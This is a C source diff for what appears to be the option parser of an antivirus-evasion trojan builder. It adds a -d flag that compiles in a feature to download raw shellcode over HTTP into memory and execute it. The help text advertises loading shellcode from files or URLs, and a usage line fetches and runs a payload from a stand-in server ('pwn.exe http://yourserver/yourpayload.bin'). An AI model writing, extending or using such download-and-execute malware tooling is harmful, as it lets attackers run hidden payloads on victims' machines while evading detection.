@@ -21,7 +21,6 @@ int main (int argc, char **argv)
 
 	print_debug = 0;
 	load_from_file = 0;
-	char *dvalue = NULL;
 	char *evalue = NULL;
 	char *fvalue = NULL;
 	char *kvalue = NULL;
@@ -33,6 +32,7 @@ int main (int argc, char **argv)
 	int Eflag = 0;
 	int Aflag = 0;
 	int qflag = 0;
+	int dflag = 0;
 
 	int index;
 	int c;
@@ -40,11 +40,11 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "d:e:f:k:u:w:lphFXEAq")) != -1)
+	while ((c = getopt (argc, argv, "e:f:k:u:w:lphdFXEAq")) != -1)
 		switch (c)
 		{
 			case 'd':
-				dvalue = optarg;
+				dflag = 1;
 				break;
 			case 'e':
 				evalue = optarg;
@@ -86,9 +86,7 @@ int main (int argc, char **argv)
 				print_debug = 1;
 				break;
 			case '?':
-				if (optopt == 'd')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (optopt == 'e')
+				if (optopt == 'e')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
 				else if (optopt == 'f')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
@@ -219,6 +217,9 @@ int main (int argc, char **argv)
 	if(qflag)
 		fprintf (file_def, "#define QUIET\n");
 
+	if(dflag)
+		fprintf (file_def, "#define DOWNLOADEXECSC\n");
+
 	fclose(file_def);
 
 	//the killswitch
@@ -247,6 +248,8 @@ void print_help()
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
 	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
+	printf("-d download a raw shellcode via http in memory and exec (no overhead, use socket)\n");
+	printf("   usage example: pwn.exe http://yourserver/yourpayload.bin\n");
 	printf("-E use avets ASCII encryption, often do not has to be used\n");
 	printf("   Note: with -l -E is mandatory\n");
 	//printf("-A use metasploits ASCII encryption, usage is like -E\n");
